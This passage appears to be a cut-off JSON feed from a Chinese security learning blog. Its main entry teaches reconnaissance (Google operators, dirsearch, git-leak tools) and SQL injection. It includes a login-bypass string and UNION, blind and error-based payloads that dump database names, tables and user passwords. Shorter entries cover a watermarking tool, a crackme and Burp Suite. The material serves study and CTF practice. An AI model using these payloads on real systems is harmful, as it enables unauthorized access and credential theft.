data-url=\"aHR0cHM6Ly9zZWMubHkuY29tL2J1Z3M=\">https://sec.ly.com/bugs</span></li>\n<li>PHITHON 的公开漏洞    <span class=\"exturl\" data-url=\"aHR0cHM6Ly9idWdzLmxlYXZlc29uZ3MuY29t\">https://bugs.leavesongs.com</span></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"漏洞数据库\"><a class=\"anchor\" href=\"#漏洞数据库\">#</a> 漏洞数据库</h4>\n<ul>\n<li>中文 CVE   <span class=\"exturl\" data-url=\"aHR0cDovL2N2ZS5zY2FwLm9yZy5jbg==\">http://cve.scap.org.cn</span></li>\n<li>exp 库     <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leHBrdS5jb20=\">http://www.expku.com</span></li>\n<li>洞悉漏洞     <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWVidWcub3Jn\">https://seebug.org</span></li>\n</ul>\n<h3 id=\"googlehack语法\"><a class=\"anchor\" href=\"#googlehack语法\">#</a> googlehack 语法</h3>\n<p>intext：关键字<br />\n搜索网页正文中含有这些关键字的网页。</p>\n<p>intitle：关键字<br />\n搜索网页标题中含有这些关键字的网页。</p>\n<p>cache：关键字<br />\n搜索含有关键字内容的 cache。</p>\n<p>define：关键字<br />\n搜索关键字的定义。</p>\n<p>filetype：文件名。后缀名<br />\n搜索特定的文件。</p>\n<p>info：关键字<br />\n搜索指定站点的一些基本信息。</p>\n<p>inurl：关键字<br />\n搜索含有关键字的 URL 地址。</p>\n<p>（示例：&quot;inurl:php?id=&quot; 意为 搜索网站 url 中包括了 &quot;php?id=&quot; 关键字的网站，寻找可能含有 sql 注入的网页）</p>\n<p>（注：&quot;inurl:&quot; 后不能接空格，应直接接关键词）</p>\n<p>（inurl 在搜索资源的功能上十分的强大，目前 filetype: 用法 google 无法使用）</p>\n<p>（示例：&quot;inurl:&quot;say something&quot;mp3&quot; 可搜索到 say something 的 mp3 文件）</p>\n<p>例：inurl：.edu.cn</p>\n<p>link：关键字<br />\n查找与关键字做了链接的 URL 地址。</p>\n<p>site：域名<br />\n返回域名中所有的 URL 地址。</p>\n<p>related：URL<br />\n 搜索与指定 URL 相关的页面。</p>\n<h3 id=\"目录扫描脚本dirsearch\"><a class=\"anchor\" href=\"#目录扫描脚本dirsearch\">#</a> 目录扫描脚本 dirsearch</h3>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL2RpcnNlYXJjaC5weQ==\">dirsearch.py</span> -u  网址 -e php</p>\n<p>-u 指定网址</p>\n<p>-e  指定网站语言</p>\n<p>-w  指定字典</p>\n<p>-r  递归目录（跑出目录后，继续跑目录下面的目录）</p>\n<p>注意扫描 /.index.php.swp, index.php~ 等备份文件</p>\n<p>扫描的记录会生成到文件中</p>\n<p>根据需要扩充字典，</p>\n<p>注意以下文件</p>\n<p>www.zip 网站备份源码</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3JlYWRtZS5tZA==\">readme.md</span></p>\n<p>robots.txt</p>\n<p>.swp</p>\n<p>.swo</p>\n<p>.swn</p>\n<h3 id=\"子域名爆破工具layer\"><a class=\"anchor\" href=\"#子域名爆破工具layer\">#</a> 子域名爆破工具 layer</h3>\n<h3 id=\"指纹识别\"><a class=\"anchor\" href=\"#指纹识别\">#</a> 指纹识别</h3>\n<p>wappalyzer，火狐插件</p>\n<h3 id=\"git-泄露\"><a class=\"anchor\" href=\"#git-泄露\">#</a> git 泄露</h3>\n<p>​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               githack 注意要在 python2 下环境运行</p>\n<pre><code>p GitHacker.py http://XXXXXXXXXXX/.git/\n</code></pre>\n<h2 id=\"sql注入基础\"><a class=\"anchor\" href=\"#sql注入基础\">#</a> sql 注入基础</h2>\n<h2 id=\"mysql\"><a class=\"anchor\" href=\"#mysql\">#</a> mysql</h2>\n<p>user () 返回当前数据库连接使用的用户；</p>\n<p>database () 返回当前数据库连接使用的数据库；</p>\n<p>version () 返回当前数据库的版本；</p>\n<p>concat-ws () 函数可以将这些函数进行组合使用并显示出来。concat 函数中，将其中的参数直接连接起来产生新的字符串。而在 concat_ws 函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。</p>\n<p>concat_ws(char(32,58,32),user(),database(),version())</p>\n<p>information_schema.tables<br />\ntable_schema: 记录数据库名；<br />\ntable_name: 记录数据表名；</p>\n<p>group_concat ([DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )</p>\n<h3 id=\"sql的注释\"><a class=\"anchor\" href=\"#sql的注释\">#</a> sql 的注释</h3>\n<h3 id=\"使用号\"><a class=\"anchor\" href=\"#使用号\">#</a> 使用 <code>#</code> 号</h3>\n<ul>\n<li>有时发现执行的 sql 语句中没有 <code>#</code> 号</li>\n<li>原因是 url 中 <code>#</code> 号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。<br />\n所以，HTTP 请求中不包括 <code>#</code></li>\n<li>将 #号改成 url 的编码 %23 就可以了</li>\n</ul>\n<h3 id=\"使用-和使用-\"><a class=\"anchor\" href=\"#使用-和使用-\">#</a> 使用 <code>--</code>  和使用 <code>--+</code></h3>\n<ul>\n<li>这里发现＋号在语句中变成了空格。<br />\n用来和后面的单引号分隔开，将后面的语句注释。</li>\n<li>了解原理后便知道了 <code>--</code>  无法使用的原因，是因为 <code>--</code>  与后面的单引号连接在一起，无法形成有效的 mysql 语句。</li>\n<li>在 mysql 中使用这个语句分析原因，输入后回车显示分号没有闭合</li>\n<li>所以在注入时我们除了使用 <code>--+</code>  外，也可以使用 <code>--'</code>  来完成 sql 注入语句</li>\n</ul>\n<p><img data-src=\"https://p4.ssl.qhimg.com/t01ac901bace4cef772.png\" alt=\"http://p2.qhimg.com/t0179a5120e122c8876.png\" /></p>\n<p><img data-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200201000748-d3369600-4443-1.png\" alt=\"img\" /></p>\n<h3 id=\"mysql-创建数据表\"><a class=\"anchor\" href=\"#mysql-创建数据表\">#</a> MySQL 创建数据表</h3>\n<p>创建 MySQL 数据表需要以下信息：</p>\n<ul>\n<li>表名</li>\n<li>表字段名</li>\n<li>定义每个表字段</li>\n</ul>\n<h3 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h3>\n<p>以下为创建 MySQL 数据表的 SQL 通用语法：</p>\n<pre><code>CREATE TABLE table_name (column_name column_type);\n</code></pre>\n<p>以下例子中我们将在 RUNOOB 数据库中创建数据表 runoob_tbl：</p>\n<pre><code>CREATE TABLE IF NOT EXISTS `runoob_tbl`(\n   `runoob_id` INT UNSIGNED AUTO_INCREMENT,\n   `runoob_title` VARCHAR(100) NOT NULL,\n   `runoob_author` VARCHAR(40) NOT NULL,\n   `submission_date` DATE,\n   PRIMARY KEY ( `runoob_id` )\n)ENGINE=InnoDB DEFAULT CHARSET=utf8;\n</code></pre>\n<p>实例解析：</p>\n<ul>\n<li>如果你不想字段为 <strong>NULL</strong> 可以设置字段的属性为 <strong>NOT NULL</strong>， 在操作数据库时如果输入该字段的数据为<strong> NULL</strong> ，就会报错。</li>\n<li>AUTO_INCREMENT 定义列为自增的属性，一般用于主键，数值会自动加 1。</li>\n<li>PRIMARY KEY 关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。</li>\n<li>ENGINE 设置存储引擎，CHARSET 设置编码</li>\n</ul>\n<h3 id=\"mysql-查询数据\"><a class=\"anchor\" href=\"#mysql-查询数据\">#</a> MySQL 查询数据</h3>\n<p>MySQL 数据库使用 SQL SELECT 语句来查询数据。</p>\n<p>你可以通过 mysql&gt; 命令提示窗口中在数据库中查询数据，或者通过 PHP 脚本来查询数据。</p>\n<h4 id=\"select语法\"><a class=\"anchor\" href=\"#select语法\">#</a> select 语法</h4>\n<p>以下为在 MySQL 数据库中查询数据通用的 SELECT 语法：</p>\n<pre><code>SELECT column_name,column_name\nFROM table_name\n[WHERE Clause]\n[LIMIT N][ OFFSET M]\n</code></pre>\n<ul>\n<li>查询语句中你可以使用一个或者多个表，表之间使用逗号 (,) 分割，并使用 WHERE 语句来设定查询条件。</li>\n<li>SELECT 命令可以读取一条或者多条记录。</li>\n<li>你可以使用星号（*）来代替其他字段，SELECT 语句会返回表的所有字段数据</li>\n<li>你可以使用 WHERE 语句来包含任何条件。</li>\n<li>你可以使用 LIMIT 属性来设定返回的记录数。</li>\n<li>你可以通过 OFFSET 指定 SELECT 语句开始查询的数据偏移量。默认情况下偏移量为 0。</li>\n</ul>\n<p><code>select * from runoob_tbl;</code>  例如 * 返回数据表 runoob_tbl 的所有记录</p>\n<p>我们知道从 MySQL 表中使用 SQL SELECT 语句来读取数据。</p>\n<p>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句中。</p>\n<p>以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：</p>\n<pre><code>SELECT field1, field2,...fieldN FROM table_name1, table_name2...\n[WHERE condition1 [AND [OR]] condition2.....\n</code></pre>\n<ul>\n<li>查询语句中你可以使用一个或者多个表，表之间使用逗号，分割，并使用 WHERE 语句来设定查询条件。</li>\n<li>你可以在 WHERE 子句中指定任何条件。</li>\n<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>\n<li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li>\n<li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li>\n</ul>\n<p>以下为操作符列表，可用于 WHERE 子句中。</p>\n<p>MySQL 的 WHERE 子句的字符串比较是不区分大小写的。 你可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的。</p>\n<h4 id=\"like-子句\"><a class=\"anchor\" href=\"#like-子句\">#</a> LIKE 子句</h4>\n<p>我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据， 同时我们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。</p>\n<p>WHERE 子句中可以使用等号 = 来设定获取数据的条件，如 &quot;runoob_author = '<span class=\"exturl\" data-url=\"aHR0cDovL1JVTk9PQi5DT00=\">RUNOOB.COM</span>'&quot;。</p>\n<p>但是有时候我们需要获取 runoob_author 字段含有 &quot;COM&quot; 字符的所有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。</p>\n<p>SQL LIKE 子句中使用百分号 % 字符来表示任意字符，类似于 UNIX 或正则表达式中的星号 *。</p>\n<p>如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。</p>\n<p>以下是 SQL SELECT 语句使用 LIKE 子句从数据表中读取数据的通用语法：</p>\n<pre><code>SELECT field1, field2,...fieldN \nFROM table_name\nWHERE field1 LIKE condition1 [AND [OR]] filed2 = 'somevalue'\n</code></pre>\n<ul>\n<li>你可以在 WHERE 子句中指定任何条件。</li>\n<li>你可以在 WHERE 子句中使用 LIKE 子句。</li>\n<li>你可以使用 LIKE 子句代替等号 =。</li>\n<li>LIKE 通常与 % 一同使用，类似于一个元字符的搜索。</li>\n<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>\n<li>你可以在 DELETE 或 UPDATE 命令中使用  WHERE...LIKE 子句来指定条件。</li>\n</ul>\n<h4 id=\"union子句\"><a class=\"anchor\" href=\"#union子句\">#</a> union 子句</h4>\n<p><strong>UNION 语句</strong>：用于将不同表中相同列中查询的数据展示出来；（不包括重复数据）</p>\n<p><strong>UNION ALL 语句</strong>：用于将不同表中相同列中查询的数据展示出来；（包括重复数据）</p>\n<p>使用形式如下：</p>\n<pre><code>SELECT 列名称 FROM 表名称 UNION SELECT 列名称 FROM 表名称 ORDER BY 列名称；\nSELECT 列名称 FROM 表名称 UNION ALL SELECT 列名称 FROM 表名称 ORDER BY 列名称；\n</code></pre>\n<h4 id=\"order-by-子句\"><a class=\"anchor\" href=\"#order-by-子句\">#</a> ORDER BY 子句</h4>\n<p>以下是 SQL SELECT 语句使用 ORDER BY 子句将查询数据排序后再返回数据：</p>\n<pre><code>SELECT field1, field2,...fieldN FROM table_name1, table_name2...\nORDER BY field1 [ASC [DESC][默认 ASC]], [field2...] [ASC [DESC][默认 ASC]]\n</code></pre>\n<ul>\n<li>你可以使用任何字段来作为排序的条件，从而返回排序后的查询结果。</li>\n<li>你可以设定多个字段来排序。</li>\n<li>你可以使用 ASC 或 DESC 关键字来设置查询结果是按升序或降序排列。 默认情况下，它是按升序排列。</li>\n<li>你可以添加 WHERE...LIKE 子句来设置条件。</li>\n</ul>\n<h4 id=\"其他sql函数\"><a class=\"anchor\" href=\"#其他sql函数\">#</a> 其他 sql 函数</h4>\n<h3 id=\"一-万能密码\"><a class=\"anchor\" href=\"#一-万能密码\">#</a> 一、万能密码</h3>\n<p>原验证登陆语句:</p>\n<figure class=\"highlight basic\"><figcaption data-lang=\"BASIC\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">SELECT</span> <span class=\"token operator\">*</span> FROM admin WHERE Username<span class=\"token operator\">=</span> '<span class=\"token string\">\".$username.\"</span>' <span class=\"token operator\">AND</span> Password<span class=\"token operator\">=</span> '<span class=\"token string\">\".md5($password).\"</span>'</pre></td></tr></table></figure><p>输入 1′ or 1=1 or ‘1’=’1# 万能密码语句变为:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>SELECT * FROM admin WHERE <span class=\"token assign-left variable\">Username</span><span class=\"token operator\">=</span><span class=\"token string\">'1'</span> OR <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> OR <span class=\"token string\">'1'</span><span class=\"token operator\">=</span><span class=\"token string\">'1'</span> AND <span class=\"token assign-left variable\">Password</span><span class=\"token operator\">=</span><span class=\"token string\">'EDFKGMZDFSDFDSFRRQWERRFGGG'</span></pre></td></tr></table></figure><p>逻辑运算的优先顺序是 NOT&gt;OR&gt;AND</p>\n<p>因为 1=1 恒为真所以并且注释掉了后面的语句，导致密码无论是啥都可以登录</p>\n<h3 id=\"二-数字型注入\"><a class=\"anchor\" href=\"#二-数字型注入\">#</a> 二、数字型注入</h3>\n<p>可以对传入表达式进行计算 来判断是否为数字型注入</p>\n<p>后端语句为</p>\n<p><code>$res=mysqli_query($conn,&quot;select title,content from wp_news where id=&quot;.$_GET['id'])</code></p>\n<p>构造 <code>？id=1 union select user,pwd from wp_user limit 1,1</code> limit 是指取查询结果第一条记录的后一条记录，或者使用 id=-1</p>\n<h4 id=\"爆库名\"><a class=\"anchor\" href=\"#爆库名\">#</a> 爆库名</h4>\n<p>mysql 的数据库 information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，<br />\n用户权限等信息， 常用的几个表</p>\n<p>SCHEMATA 表：储存 mysql 所有数据库的基本信息，包括数据库名，编码类型路径等，show databases 的结果取之此表。</p>\n<p>TABLES 表：储存 mysql 中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname 的结果取之此表</p>\n<p>COLUMNS 表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。是 show columns from schemaname.tablename 的结果取之此表。<br />\n <code>?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>\n<h4 id=\"1通过information_schema爆表名\"><a class=\"anchor\" href=\"#1通过information_schema爆表名\">#</a> 1. 通过 information_schema 爆表名</h4>\n<p>select 1 返回 1</p>\n<p><code>id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()</code></p>\n<h4 id=\"2爆字段\"><a class=\"anchor\" href=\"#2爆字段\">#</a> 2. 爆字段</h4>\n<p><code>id=-1 union select 1,group_conact(column_name)from information_schema.columns where table_name='wp_user'</code></p>\n<h4 id=\"3爆用户密码\"><a class=\"anchor\" href=\"#3爆用户密码\">#</a> 3. 爆用户密码</h4>\n<p><code>？id=1 union select user,pwd from wp_user limit 1,1</code></p>\n<h3 id=\"三-字符型注入\"><a class=\"anchor\" href=\"#三-字符型注入\">#</a> 三、字符型注入</h3>\n<p>后端语句 get 输入处若被包裹了单引号或者双引号</p>\n<p>判断方法利用 mysql 的强制类型转化例如 id=1a 转化为 id=1 有页面回显则说明为字符型注入</p>\n<p>则构造方法为 <code>id=1'--+ 或者 id=1'#</code>  加号在 url 中会被编码为空格</p>\n<p>接下来的操作就与数字型操作一样</p>\n<h3 id=\"四-无回显的注入\"><a class=\"anchor\" href=\"#四-无回显的注入\">#</a> 四、无回显的注入</h3>\n<h4 id=\"布尔盲注页面的回显有两种情况时\"><a class=\"anchor\" href=\"#布尔盲注页面的回显有两种情况时\">#</a> 布尔盲注（页面的回显有两种情况时）</h4>\n<p>布尔盲注通过页面的回显来判断 0 或者 1</p>\n<p>例如 a 为被猜测的数据 id=1’and 'a'&lt;'n'</p>\n<p>用二分法来缩小范围，就能够很快猜出字符</p>\n<p>多字符的情况</p>\n<p>利用， <code>substring mid substr 函数等</code> 来截取数据的中的一位再用单字符的清况来继续判断</p>\n<p><code>例如？id=1'and mid((select concat(user,0x7e,pwd) from wp_user，1，1))=a</code>  来猜测用户名和密码</p>\n<h4 id=\"时间盲注页面无回显\"><a class=\"anchor\" href=\"#时间盲注页面无回显\">#</a> 时间盲注（页面无回显）</h4>\n<h4 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h4>\n<p>常见的利用函数有： <code>exp()、floor()+rand()、updatexml()、extractvalue()</code>  等</p>\n<p>如： <code>select * from users where username=$username (and | or) updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p>\n<p><code> ' or updatexml(1,concat('~',database()),1) #</code></p>\n<h3 id=\"实战环节利用安装sqli-lab修炼\"><a class=\"anchor\" href=\"#实战环节利用安装sqli-lab修炼\">#</a> 实战环节利用安装 sqli-lab 修炼</h3>\n<h3 id=\"第一章-web入门sql注入-1\"><a class=\"anchor\" href=\"#第一章-web入门sql注入-1\">#</a> [第一章 web 入门] SQL 注入 - 1</h3>\n<p>order by 4 之后无回显，所以判断有三个字段</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210517221033080.png\" alt=\"image-20210517221033080\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210517222403286.png\" alt=\"image-20210517222403286\" /></p>\n<p>id=3 时发现 tips</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210517223345387.png\" alt=\"image-20210517223345387\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/%E6%96%87%E6%9C%AC%E6%B0%B4%E5%8D%B0%E7%AE%97%E6%B3%95%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/",
            "url": "https://mashiro.zone/%E6%96%87%E6%9C%AC%E6%B0%B4%E5%8D%B0%E7%AE%97%E6%B3%95%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/",
            "title": "",
            "date_published": "2021-04-24T03:35:29.086Z",
            "content_html": "<h2 id=\"文本水印算法使用说明\"><a class=\"anchor\" href=\"#文本水印算法使用说明\">#</a> 文本水印算法使用说明</h2>\n<p>首先打开 cmd 输入 pip install python-docx 安装 docx 库</p>\n<p>主要采用了特征编码的方式对信息隐写，从而生成了不可见水印，打开文件后输入 cmd，进入控制台</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421104134832.png\" alt=\"image-20210421104134832\" /></p>\n<p>输入 python .\\text_api.py path=./text/demo name=newText</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421104251656.png\" alt=\"image-20210421104251656\" /></p>\n<p>生成了文件 newText，并且生成了不可见水印</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421104348036.png\" alt=\"image-20210421104348036\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421105044419.png\" alt=\"image-20210421105044419\" /></p>\n<p>可以修改文件里的 keys 来修改水印，keys 可以为随机的整数</p>\n<p>水印的提取</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421104500626.png\" alt=\"image-20210421104500626\" /></p>\n<p>打开 decode.py 文件</p>\n<p>这里修改两处文件的路径</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421104653656.png\" alt=\"image-20210421104653656\" /></p>\n<p>把这俩处地方 /text 前面的路径改为你文件的当前目录</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421104848654.png\" alt=\"image-20210421104848654\" /></p>\n<p>运行这个 py 文件</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421104953681.png\" alt=\"image-20210421104953681\" /></p>\n<p>提取出了密钥，</p>\n<h2 id=\"音频水印算法使用说明\"><a class=\"anchor\" href=\"#音频水印算法使用说明\">#</a> 音频水印算法使用说明</h2>\n<p>首先完成环境配置</p>\n<p>1. 打开 cmd 输入 pip install pydub</p>\n<p>2. 安装 ffmpeg，解压文件后把 bin 目录添加到环境变量，点击新建即可</p>\n<p>3.<img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421110101084.png\" alt=\"image-20210421110101084\" /><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421110033033.png\" alt=\"image-20210421110033033\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421105344882.png\" alt=\"image-20210421105344882\" /></p>\n<ol start=\"4\">\n<li>pip install ffmpeg</li>\n</ol>\n<p>接着打开 audio.py 文件</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421110237263.png\" alt=\"image-20210421110237263\" /></p>\n<p>修改这三处 /aodio 前面的文件路径</p>\n<p>运行这个文件</p>\n<p>得到 demo 和 demo1 拼接后的新音频文件，</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210421110600105.png\" alt=\"image-20210421110600105\" /></p>\n<p>若要其他格式的音频文件修改第二行和第四行的代码 from_mp3 为其他格式即可</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/%E6%9C%AA%E5%91%BD%E5%90%8D/",
            "url": "https://mashiro.zone/%E6%9C%AA%E5%91%BD%E5%90%8D/",
            "title": "",
            "date_published": "2021-04-17T08:46:19.403Z",
            "content_html": "<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210415222139245.png\" alt=\"image-20210415222139245\" /></p>\n<p>用 ida 打开 cm2 找到输出函数</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210415220652683.png\" alt=\"image-20210415220652683\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210415220920924.png\" alt=\"image-20210415220920924\" /></p>\n<p>进入 od 查找 00401B1D</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210415221513854.png\" alt=\"image-20210415221513854\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210415221648961.png\" alt=\"image-20210415221648961\" /></p>\n<p>得到用户名和密码</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210416213550674.png\" alt=\"image-20210416213550674\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210416214424583.png\" alt=\"image-20210416214424583\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210416220517342.png\" alt=\"image-20210416220517342\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210416221059208.png\" alt=\"image-20210416221059208\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424223938671.png\" alt=\"image-20210424223938671\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424223959019.png\" alt=\"image-20210424223959019\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424224023407.png\" alt=\"image-20210424224023407\" /></p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424224040559.png\" alt=\"image-20210424224040559\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/BURP/",
            "url": "https://mashiro.zone/BURP/",
            "title": "",
            "date_published": "2021-04-03T14:59:59.903Z",
            "content_html": "<h2 id=\"burp\"><a class=\"anchor\" href=\"#burp\">#</a> BURP</h2>\n<p>drop 表示丢弃 http 请求</p>\n<p>Action 表示发送到其他模块中</p>\n<p>raw hex  headers hex 以不同方式展示</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403191812334.png\" alt=\"image-20210403191812334\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403192046549.png\" alt=\"image-20210403192046549\" /></p>\n<p>HTTP history</p>\n<p>查看请求头，html ，Render 显示的是和浏览器中一样的内容</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403192336678.png\" alt=\"image-20210403192336678\" /></p>\n<p>过滤</p>\n<h2 id=\"options模块\"><a class=\"anchor\" href=\"#options模块\">#</a> OPTIONS 模块</h2>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403192637661.png\" alt=\"image-20210403192637661\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403192813167.png\" alt=\"image-20210403192813167\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403193044131.png\" alt=\"image-20210403193044131\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403193301028.png\" alt=\"image-20210403193301028\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403193618148.png\" alt=\"image-20210403193618148\" /></p>\n<p>杂项设置</p>\n<p>可以设置 HTTP 协议版本</p>\n<h2 id=\"利用burp截取手机流量\"><a class=\"anchor\" href=\"#利用burp截取手机流量\">#</a> 利用 burp 截取手机流量</h2>\n<p>在同一个 wifi 下</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403194049080.png\" alt=\"image-20210403194049080\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403194410794.png\" alt=\"image-20210403194410794\" /></p>\n<h2 id=\"文件上传绕过\"><a class=\"anchor\" href=\"#文件上传绕过\">#</a> 文件上传绕过</h2>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403200556382.png\" alt=\"image-20210403200556382\" /></p>\n<p>也可 f12 手工剔除</p>\n<p>action 的 url 要写清楚</p>\n<h2 id=\"target模块\"><a class=\"anchor\" href=\"#target模块\">#</a> Target 模块</h2>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210403201336523.png\" alt=\"image-20210403201336523\" /></p>\n<p>sitemap 使用目录文件</p>\n<p>Advisory 弱点情况</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/%E9%97%AE%E9%A2%98/",
            "url": "https://mashiro.zone/%E9%97%AE%E9%A2%98/",
            "title": "",
            "date_published": "2021-03-29T14:09:37.109Z",
